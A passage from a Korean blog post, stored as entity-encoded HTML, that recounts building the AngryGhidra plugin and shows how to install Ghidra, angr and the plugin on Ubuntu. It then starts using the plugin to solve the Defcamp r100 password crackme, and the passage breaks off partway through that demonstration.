&#xB9B4;&#xB9AC;&#xC988; &#xBC84;&#xC804;&#xC744; &#xC124;&#xCE58;&#xD558;&#xC5EC; Extension &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xB41C;&#xB2E4; &#xD588;&#xB2E4;.</p><p>&#x2192; &#xADFC;&#xB370; &#xC65C; &#xB9B4;&#xB9AC;&#xC988; &#xBC84;&#xC804;&#xC774; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xC5C6;&#xB294; &#xAC70;&#xC9C0;? &#xD568;&#xC815;&#xC778;&#xAC00;</p><p>&#xADF8;&#xB0E5; git clone&#xD558;&#xBA74; &#xBE4C;&#xB4DC; &#xB41C; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xC744; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD558;&#xC600;&#xC73C;&#xB098; &#xC5C6;&#xC5C8;&#xB2E4;.</p><p>&#x2192; clone&#xD558;&#xACE0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xB4E4; &#xC804;&#xBD80;&#xB2E4; Ghidra Extension&#xC5D0;&#xC11C; &#xD074;&#xB9AD;&#xD574;&#xBD24;&#xC73C;&#xB098; &#xC624;&#xB958;&#xB9CC; &#xC5C4;&#xCCAD; &#xB738;.. build.gradle &#xD30C;&#xC77C;&#xC774; &#xC788;&#xC73C;&#xB2C8; gradle&#xB85C; &#xBE4C;&#xB4DC;&#xB97C; &#xD574;&#xBCF4;&#xC790;</p><p>gradle&#xC744; &#xD1B5;&#xD574; &#xBE4C;&#xB4DC;&#xB97C; &#xD558;&#xB294;&#xB370; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB418;&#xC9C8; &#xC54A;&#xB124;..?</p><p>&#x2192; &#xB0B4;&#xAC00; &#xBB58; &#xD558;&#xB824; &#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xC624;&#xB958;&#xAC00; &#xB72C;&#xB2E4;&#x2026; &#xC774;&#xCBE4;&#xC5D0;&#xC11C; &#xBA58;&#xD0C8;&#xC774; &#xB098;&#xAC00;&#xC11C; &#xD63C;&#xC790; &#xBAA8;&#xB2C8;&#xD130; &#xC55E;&#xC5D0;&#xC11C; &#xC695;&#xC744; &#xD558;&#xAE30; &#xC2DC;&#xC791;</p><p>&#xC6B0;&#xC5EC;&#xACE1;&#xC808; &#xC18D;&#xC5D0;&#xC11C; &#xBE4C;&#xB4DC; &#xC131;&#xACF5;(!) &#xD6C4; &#xC2E0;&#xB098;&#xC11C; L0ch&#xC5D0;&#xAC8C; &#xC57C; &#xBE4C;&#xB4DC; &#xD588;&#xB2E4; &#xC774;&#xC81C; &#xB3CC;&#xB824;&#xBCF8;&#xB2E4; &#xC606;&#xC5D0;&#xC11C; &#xB531; &#xAE30;&#xB2E4;&#xB824; &#x314B;&#x314B;&#xD558;&#xACE0; &#xC606;&#xC5D0; &#xC138;&#xC6CC;&#xB480;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xAC00;&#xC838;&#xC628; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB3CC;&#xB838;&#xB294;&#xB370; angr&#xAC00; &#xB3CC;&#xC544;&#xAC00;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;&#x2026;</p><blockquote><p>L0ch &#x65E5; : &#xC544;&#xB2C8; &#xD615; &#xB41C;&#xB2E4;&#xBA74;&#xC11C; &#xC548;&#xB418;&#xC796;&#xC544; &#xBB50;&#xC57C; &#xBE68;&#xB9AC; &#xB2E4;&#xC2DC; &#xC0BD;&#xC9C8;&#xD574;&#xC694;</p></blockquote><p><del>&#xB098;&#xC05C;&#xB118;</del> &#xC544;&#xBB34;&#xD2BC; &#xC5EC;&#xAE30;&#xC11C; &#xBA48;&#xCD9C; &#xC218; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C; angr&#xB97C; &#xC7AC;&#xC124;&#xCE58;&#xD574;&#xBCF4;&#xACE0; python &#xBC84;&#xC804;&#xC774; &#xBB38;&#xC820;&#xAC00; &#xC0BD;&#xC9C8;&#xC744; &#xB2E4;&#xC2DC; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;&#x2026;</p><p>&#xACB0;&#xAD6D; &#xBA58;&#xD0C8;&#xC774; &#xBC15;&#xC0B4; &#xB09C; &#xC0C1;&#xD0DC;&#xB85C; &#xC9D1;&#xC5D0; &#xAC00;&#xC11C; &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158;(?)&#xC744; &#xBCF4;&#xBA70; &#xD790;&#xB9C1; &#xD6C4; &#xB2E4;&#xC74C; &#xB0A0; &#xB2E4;&#xC2DC; &#xB3C4;&#xC804;&#xC744; &#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>UE(User Error)&#xC77C; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xD06C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA70; &#xC624;&#xB298;&#xC758; &#xB098;&#xC640; &#xC5B4;&#xC81C;&#xC758; &#xB098;&#xB294; &#xB2E4;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB610; &#xB3CC;&#xB838;&#xB294;&#xB370; &#xC2E4;&#xD589;&#xC774; &#xC548; &#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.. &#xB3C4;&#xB300;&#xCCB4; &#xC65C; &#xC548;&#xB3FC;?&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xCC30;&#xB098; &#xB0B4; &#xBA38;&#xB9AC;&#xC5D0; &#xC2A4;&#xCE5C; &#xC0DD;&#xAC01;</p><blockquote><p>&#xC544;&#xB2C8; &#xC774;&#xAC70; elf &#xD30C;&#xC77C;&#xC778;&#xB370; &#xC65C; windows&#xC5D0;&#xC11C; &#xB3CC;&#xB9AC;&#xACE0; &#xC788;&#xC9C0;??</p></blockquote><p align="center"><img src="./img1.jpg" width="60%" height="60%"></p><p>ubuntu&#xB85C; &#xC62E;&#xAE34; &#xB2E4;&#xC74C;&#xC5D0; &#xB2E4;&#xC2DC; &#xC704;&#xC758; &#xACFC;&#xC815; &#xBC18;&#xBCF5; &#xD6C4; &#xB2E4;&#xC2DC; L0ch&#xB97C; &#xBD88;&#xB800;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC790;&#xC2DD;&#xC740; &#xD615;&#xC774; &#xBD80;&#xB974;&#xB294;&#xB370; &#xB9E8;&#xB0A0; &#xD22C;&#xB35C;&#xAC70;&#xB824;&#xC694;. &#x201C;&#xC548;&#xB418;&#xAE30;&#xB9CC; &#xD574; &#xBD10;&#x201D; &#xD558;&#xBA74;&#xC11C; &#xC640;&#xB193;&#xACE0; &#xB418;&#xB2C8;&#xAE4C; &#xB530;&#xBD09; &#xB0A0;&#xB9AC;&#xACE0; &#xAC11;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC;&#xB294; Pre-release&#xB85C; AngryGhidra v0.1&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xC0C1;&#xD0DC;&#xB77C;&#xC11C; &#xADC0;&#xCC2E;&#xC73C;&#xC2E0; &#xBD84;&#xC740; <a href="https://github.com/Nalen98/AngryGhidra/releases">&#xB9B4;&#xB9AC;&#xC988; &#xBC84;&#xC804;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;</a> &#xBC1B;&#xC544; Extension&#xC744; &#xBC14;&#xB85C; &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xB420; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xADFC;&#xB370;-Ghidra&#xAC00;-&#xBB54;&#xB370;"><a href="#&#xADFC;&#xB370;-Ghidra&#xAC00;-&#xBB54;&#xB370;" class="headerlink" title="&#xADFC;&#xB370; Ghidra&#xAC00; &#xBB54;&#xB370;?"></a>&#xADFC;&#xB370; Ghidra&#xAC00; &#xBB54;&#xB370;?</h1><p><a href="https://ghidra-sre.org/">Ghidra</a>&#xB294; NSA&#xC5D0;&#xC11C; &#xAC1C;&#xBC1C;&#xD55C; &#xC5ED;&#xC5B4;&#xC148;&#xBE14;&#xB7EC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. &#xBB50; &#xD558;&#xB294; &#xB140;&#xC11D;&#xC778;&#xC9C0; &#xC798; &#xBAA8;&#xB974;&#xACA0;&#xC73C;&#xBA74; IDA &#xAC19;&#xC740; &#xB140;&#xC11D;&#xC774;&#xB77C;&#xACE0; &#xBCF4;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC624;&#xD508; &#xC18C;&#xC2A4;&#xB85C; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC73C;&#xBA70; jdk 11 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xB978; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xCC98;&#xB7FC; &#xC124;&#xCE58; &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; &#xC124;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2CC; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4; &#xBC1B;&#xC544;&#xC11C; &#xC555;&#xCD95;&#xB9CC; &#xD574;&#xC81C;&#xD558;&#xBA74; &#xBC14;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC9C0;&#xC6D0; &#xD50C;&#xB7AB;&#xD3FC;</p><ul><li>Windows 7 or 10 (64bit)</li><li>Linux (64bit, CentOs 7 is preferred)</li><li>macOS(OS X) 10.8.3+ (Mountain Lion or later)</li></ul><p>32&#xBE44;&#xD2B8; OS&#xC5D0;&#xC11C;&#xB294; Ghidra&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="&#xC6B0;&#xBD84;&#xD22C;&#xC5D0;-Ghidra-&#xC124;&#xCE58;&#xD558;&#xAE30;"><a href="#&#xC6B0;&#xBD84;&#xD22C;&#xC5D0;-Ghidra-&#xC124;&#xCE58;&#xD558;&#xAE30;" class="headerlink" title="&#xC6B0;&#xBD84;&#xD22C;&#xC5D0; Ghidra &#xC124;&#xCE58;&#xD558;&#xAE30;"></a>&#xC6B0;&#xBD84;&#xD22C;&#xC5D0; Ghidra &#xC124;&#xCE58;&#xD558;&#xAE30;</h2><h3 id="&#xC790;&#xBC14;-&#xD658;&#xACBD;-&#xC124;&#xCE58;"><a href="#&#xC790;&#xBC14;-&#xD658;&#xACBD;-&#xC124;&#xCE58;" class="headerlink" title="&#xC790;&#xBC14; &#xD658;&#xACBD; &#xC124;&#xCE58;"></a>&#xC790;&#xBC14; &#xD658;&#xACBD; &#xC124;&#xCE58;</h3><pre><code class="hljs bash">$ sudo add-apt-repository ppa:openjdk-r/ppa$ sudo apt install openjdk-11-jre openjdk-11-jre-headless openjdk-11-jdk openjdk-11-jdk-headless</code></pre><h3 id="Ghidra-&#xC124;&#xCE58;"><a href="#Ghidra-&#xC124;&#xCE58;" class="headerlink" title="Ghidra &#xC124;&#xCE58;"></a>Ghidra &#xC124;&#xCE58;</h3><p><a href="https://ghidra-sre.org/">&#xAE30;&#xB4DC;&#xB77C; &#xC0AC;&#xC774;&#xD2B8;</a>&#xC5D0;&#xC11C; &#xCD5C;&#xC2E0; &#xBC84;&#xC804;&#xC758; &#xAE30;&#xB4DC;&#xB77C;&#xB97C; &#xC124;&#xCE58;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/25/idioth/angryghidra/img2.png" alt></p><p>&#xC124;&#xCE58; &#xD6C4; &#xC6D0;&#xD558;&#xB294; &#xD3F4;&#xB354;&#xC5D0;&#xC11C; &#xC555;&#xCD95;&#xC744; &#xD574;&#xC81C;&#xD558;&#xBA74; ghidra&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xCE58;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">idioth@ubuntu:~$ ls -al ghidra_9.1.2_PUBLICtotal 56drwxr-xr-x  9 idioth idioth  4096  9&#xC6D4; 11 15:15 .drwxr-xr-x 31 idioth idioth  4096  9&#xC6D4; 14 17:01 ..drwxr-xr-x  5 idioth idioth  4096  2&#xC6D4; 12  2020 docsdrwxr-xr-x  5 idioth idioth  4096  2&#xC6D4; 12  2020 Extensionsdrwxr-xr-x  8 idioth idioth  4096  2&#xC6D4; 12  2020 Ghidra-rwxr-xr-x  1 idioth idioth   883  2&#xC6D4; 12  2020 ghidraRun-rw-r--r--  1 idioth idioth   384  2&#xC6D4; 12  2020 ghidraRun.batdrwxr-xr-x  7 idioth idioth  4096  2&#xC6D4; 12  2020 GPL-rw-r--r--  1 idioth idioth 11357  2&#xC6D4; 12  2020 LICENSEdrwxr-xr-x  2 idioth idioth  4096  2&#xC6D4; 12  2020 licensesdrwxr-xr-x  2 idioth idioth  4096  2&#xC6D4; 12  2020 serverdrwxr-xr-x  2 idioth idioth  4096  2&#xC6D4; 12  2020 support</code></pre><p>Windows&#xC758; &#xACBD;&#xC6B0; ghidraRun.bat&#xB97C; &#xD1B5;&#xD574; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC6B0;&#xBD84;&#xD22C;&#xC758; &#xACBD;&#xC6B0; ghidraRun&#xC744; &#xD1B5;&#xD574; &#xC2E4;&#xD589;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. &#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xC744; &#xACBD;&#xC6B0; chmod +x ghidraRun&#xC744; &#xD1B5;&#xD574; &#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xC744; &#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="AngryGhidra"><a href="#AngryGhidra" class="headerlink" title="AngryGhidra"></a>AngryGhidra</h1><p>&#xAE30;&#xB4DC;&#xB77C;&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xCE58;&#xB418;&#xC5C8;&#xB2E4;&#xBA74; <a href="https://github.com/Nalen98/AngryGhidra/releases">AngryGhidra</a>&#xB97C; &#xC124;&#xCE58;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><h2 id="Angr-&#xC124;&#xCE58;"><a href="#Angr-&#xC124;&#xCE58;" class="headerlink" title="Angr &#xC124;&#xCE58;"></a>Angr &#xC124;&#xCE58;</h2><pre><code class="hljs bash">$ sudo pip3 install angr</code></pre><h2 id="Releases&#xB85C;-&#xD50C;&#xB7EC;&#xADF8;&#xC778;-&#xB4F1;&#xB85D;"><a href="#Releases&#xB85C;-&#xD50C;&#xB7EC;&#xADF8;&#xC778;-&#xB4F1;&#xB85D;" class="headerlink" title="Releases&#xB85C; &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xB4F1;&#xB85D;"></a>Releases&#xB85C; &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xB4F1;&#xB85D;</h2><p>pre-releases&#xAC00; &#xC62C;&#xB77C;&#xC654;&#xC73C;&#xB2C8; &#xC800;&#xC640; &#xAC19;&#xC740; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44;(?)&#xB294; &#xD558;&#xC9C0; &#xB9D0;&#xACE0; &#xB9B4;&#xB9AC;&#xC988; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xB4F1;&#xB85D;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs bash">$ wget https://github.com/Nalen98/AngryGhidra/releases/download/0.1%2Bghidra-9.1.2/ghidra_9.1.2_PUBLIC_20200909_AngryGhidra.zip</code></pre><p>&#xB9B4;&#xB9AC;&#xC988; &#xBC84;&#xC804;&#xC744; &#xC124;&#xCE58;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/25/idioth/angryghidra/img3.png" alt></p><p>&#xAE30;&#xB4DC;&#xB77C; &#xC2E4;&#xD589; &#xD6C4; File-Install Extensions&#xC744; &#xC120;&#xD0DD;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/25/idioth/angryghidra/img4.png" alt></p><p>&#xC6B0;&#xCE21; &#xC0C1;&#xB2E8;&#xC5D0; +&#xBC84;&#xD2BC;&#xC744; &#xC120;&#xD0DD;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/25/idioth/angryghidra/img5.png" alt></p><p>&#xC124;&#xCE58; &#xBC1B;&#xC740; zip &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD574; &#xC900; &#xD6C4; &#xCCB4;&#xD06C;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xBA74; &#xB05D;&#xB0A9;&#xB2C8;&#xB2E4;. &#xCCB4;&#xD06C;&#xD558;&#xACE0; OK &#xB204;&#xB974;&#xBA74; &#xC124;&#xCE58; &#xC644;&#xB8CC;~</p><h2 id="Gradle&#xC744;-&#xD1B5;&#xD574;&#xC11C;-&#xC9C1;&#xC811;-&#xBE4C;&#xB4DC;&#xD558;&#xB294;-&#xBC29;&#xBC95;"><a href="#Gradle&#xC744;-&#xD1B5;&#xD574;&#xC11C;-&#xC9C1;&#xC811;-&#xBE4C;&#xB4DC;&#xD558;&#xB294;-&#xBC29;&#xBC95;" class="headerlink" title="Gradle&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xC9C1;&#xC811; &#xBE4C;&#xB4DC;&#xD558;&#xB294; &#xBC29;&#xBC95;"></a>Gradle&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xC9C1;&#xC811; &#xBE4C;&#xB4DC;&#xD558;&#xB294; &#xBC29;&#xBC95;</h2><p>&#xB9B4;&#xB9AC;&#xC988; &#xBC84;&#xC804;&#xC774; &#xC62C;&#xB77C;&#xC640; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAD73;&#xC774; &#xC774; &#xBC29;&#xBC95;&#xC744; &#xD0DD;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xC774; &#xC5C6;&#xC744; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD558;&#xC9C0;&#xB9CC; &#xD639;&#xC2DC; &#xBCF8;&#xC778;&#xC774; &#xC9C1;&#xC811; &#xBE4C;&#xB4DC; &#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xC73C;&#xC2DC;&#xB2E4;&#xBA74; &#xC9C1;&#xC811; &#xBE4C;&#xB4DC; &#xD574;&#xBCF4;&#xC2DC;&#xB294; &#xAC83;&#xB3C4; &#xCD94;&#xCC9C;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">$ sudo apt install gradle$ git <span class="hljs-built_in">clone</span> https://github.com/Nalen98/AngryGhidra</code></pre><p>gradle&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xBE4C;&#xB4DC; &#xD558;&#xAE30; &#xC704;&#xD574; gradle&#xC744; &#xC124;&#xCE58;&#xD558;&#xACE0; AngryGhidra repository&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">~/AngryGhidra$ gradle buildExtensionStarting a Gradle Daemon, 1 incompatible and 1 stopped Daemons could not be reused, use --status <span class="hljs-keyword">for</span> detailsFAILURE: Build failed with an exception.* Where:Build file <span class="hljs-string">&apos;/home/idioth/AngryGhidra/build.gradle&apos;</span> line: 31* What went wrong:A problem occurred evaluating root project <span class="hljs-string">&apos;AngryGhidra&apos;</span>.&gt; GHIDRA_INSTALL_DIR is not defined!* Try:Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more <span class="hljs-built_in">log</span> output. Run with --scan to get full insights.* Get more <span class="hljs-built_in">help</span> at https://help.gradle.orgBUILD FAILED <span class="hljs-keyword">in</span> 3s</code></pre><p>&#xADF8;&#xB0E5; &#xBE4C;&#xB4DC;&#xB97C; &#xC9C4;&#xD589;&#xD560; &#xACBD;&#xC6B0; &#xAE30;&#xB4DC;&#xB77C;&#xC758; &#xC124;&#xCE58; &#xACBD;&#xB85C;&#xB97C; &#xC54C; &#xC218; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xBE4C;&#xB4DC;&#xAC00; &#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC880; &#xB354; &#xB611;&#xB611;&#xD55C;(?) &#xC81C;&#xAC00; &#xAC00;&#xB974;&#xCCD0;&#xC8FC;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">~/AngryGhidra$ sudo GHIDRA_INSTALL_DIR=/home/idioth/ghidra_9.1.2_PUBLIC gradle buildExtension&gt; Task :buildHelp INFO  Using <span class="hljs-built_in">log</span> config file: jar:file:/home/idioth/ghidra_9.1.2_PUBLIC/Ghidra/Framework/Generic/lib/Generic.jar!/generic.log4j.xml (LoggingInitialization)  INFO  Using <span class="hljs-built_in">log</span> file: /root/.ghidra/.ghidra_9.1.2_PUBLIC/application.log (LoggingInitialization)  [JavaHelpFilesBuilder] Generating Help Files <span class="hljs-keyword">for</span>: [file:///home/idioth/AngryGhidra/src/main/<span class="hljs-built_in">help</span>/<span class="hljs-built_in">help</span>/][JavaHelpFilesBuilder] Generating map file: file:///home/idioth/AngryGhidra/build/<span class="hljs-built_in">help</span>/main/<span class="hljs-built_in">help</span>/AngryGhidra_map.xml...[JavaHelpFilesBuilder]  finished generating map file[JavaHelpFilesBuilder] Generating TOC file: AngryGhidra_TOC.xml...[JavaHelpFilesBuilder]  finished generating TOC file[JavaHelpFilesBuilder] Done generating <span class="hljs-built_in">help</span> files <span class="hljs-keyword">for</span> module: AngryGhidra&gt; Task :buildExtension Created ghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip <span class="hljs-keyword">in</span> /home/idioth/AngryGhidra/distBUILD SUCCESSFUL <span class="hljs-keyword">in</span> 15s8 actionable tasks: 8 executed</code></pre><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xC790;&#xC2E0;&#xC758; &#xAE30;&#xB4DC;&#xB77C; &#xACBD;&#xB85C;&#xB97C; &#xCD94;&#xAC00;&#xD574; &#xC900; &#xD6C4; &#xBE4C;&#xB4DC;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs bash">~/AngryGhidra/dist$ lsghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip</code></pre><p>&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xBE4C;&#xB4DC;&#xAC00; &#xC9C4;&#xD589;&#xB410;&#xB2E4;&#xBA74; dist &#xD3F4;&#xB354;&#xC5D0; Extension &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xAE41;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xAE4C;&#xC9C0; &#xC624;&#xC168;&#xB2E4;&#xBA74; &#xB9B4;&#xB9AC;&#xC988;&#xB97C; &#xD1B5;&#xD574; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><h2 id="AngryGhidra&#xB97C;-&#xD1B5;&#xD55C;-&#xBB38;&#xC81C;-&#xD480;&#xC774;"><a href="#AngryGhidra&#xB97C;-&#xD1B5;&#xD55C;-&#xBB38;&#xC81C;-&#xD480;&#xC774;" class="headerlink" title="AngryGhidra&#xB97C; &#xD1B5;&#xD55C; &#xBB38;&#xC81C; &#xD480;&#xC774;"></a>AngryGhidra&#xB97C; &#xD1B5;&#xD55C; &#xBB38;&#xC81C; &#xD480;&#xC774;</h2><p>angr&#xB85C; &#xD478;&#xB294; &#xBB38;&#xC81C; &#xC911; &#xAC00;&#xC7A5; &#xAC04;&#xB2E8;&#xD55C;(?) <a href="https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/reverse/r100/r100.bin">Defcamp - r100</a>&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xC5B4;&#xB5A4; &#xC2DD;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xAE30;&#xB4DC;&#xB77C;&#xB85C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4;&#xC900; &#xD6C4; main &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_004007e8</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">int</span> iVar1;<span class="hljs-keyword">char</span> *pcVar2;undefined8 uVar3;<span class="hljs-keyword">long</span> in_FS_OFFSET;<span class="hljs-keyword">char</span> local_118 [<span class="hljs-number">264</span>];<span class="hljs-keyword">long</span> local_10;local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password: &quot;</span>);pcVar2 = fgets(local_118, <span class="hljs-number">0xff</span>, <span class="hljs-built_in">stdin</span>);<span class="hljs-keyword">if</span> (pcVar2 == (<span class="hljs-keyword">char</span> *)<span class="hljs-number">0x0</span>) {uVar3 = <span class="hljs-number">0</span>;}<span class="hljs-keyword">else</span> {iVar1 = FUN_004006fd(local_118);<span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) {put(<span class="hljs-string">&quot;Nice!&quot;</span>);uVar3 = <span class="hljs-number">0</span>;}<span class="hljs-keyword">else</span> {<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Incorrect password!&quot;</span>);uVar3 = <span class="hljs-number">1</span>;}}<span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) {__stack_chk_fail();}<span class="hljs-keyword">return</span> uVar3;}</code></pre><p>password&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xACE0; <code>FUN_004006fd</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xC218;&#xD589;&#xC744; &#xD558;&#xACE0; return &#xAC12;&#xC5D0; &#xB530;&#xB77C;&#xC11C; Nice&#xC640; incorrect&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB124;&#xC694;.</p><p>Incorrect &#xBD80;&#xBD84;&#xC744; &#xD53C;&#xD558;&#xACE0; Nice&#xB85C; &#xAC00;&#xB294; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xCC3E;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC800; &#xD568;&#xC218;&#xB97C; &#xC77C;&#xC77C;&#xC774; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xC6B0;&#xB9AC;&#xC5D0;&#xAC8C;&#xB294; AngryGhidra&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/25/idioth/angryghidra/img6.png" alt></p><p>&#xBA3C;&#xC800; &#xD568;&#xC218;&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; blank state&#xB97C; &#xC124;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/25/idioth/angryghidra/img7.png" alt></p><p>&#xC6B0;&#xB9AC;&#xB294; Nice &#xBB38;&#xC790;&#xC5F4; &#xBD80;&#xBD84;&#xC73C;&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB294; &#xAC12;&#xC744; &#xCC3E;&#xACE0; &#xC2F6;&#xC73C;&#xB2C8; Nice &#xCABD;&#xC73C;&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB294; &#xC8FC;&#xC18C;&#xB97C; Find Address&#xB85C; &#xC124;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/25/idioth/angryghidra/img8.png" alt></p><p>Incorrect&#xB85C; &#xAC00;&#xB294; &#xBD80;&#xBD84;&#xC740; &#xD53C;&#xD574;&#xC57C; &#xB418;&#xB2C8; Avoid Address&#xB85C; &#xC124;&#xC815;&#xD55C; &#xB2E4;&#xC74C;&#xC5D0; AngryGhidra&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><p><img src="/2020/10/25/idioth/angryghidra/img9.png" alt></p><p><img 